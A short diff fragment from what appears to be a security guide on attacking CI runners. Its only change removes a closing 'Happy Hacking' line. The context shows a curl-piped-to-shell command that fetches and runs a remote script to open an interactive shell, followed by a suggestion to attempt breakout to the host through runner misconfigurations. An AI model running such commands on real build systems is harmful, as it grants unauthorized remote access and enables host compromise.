@@ -291,5 +291,3 @@ $ curl -sSf https://sshx.io/get | sh -s run
 ```
 
 From the interactive shell, you can now try breakout to the host, or find runner misconfigurations e.g. host mounted volumes.
-
-Happy Hacking
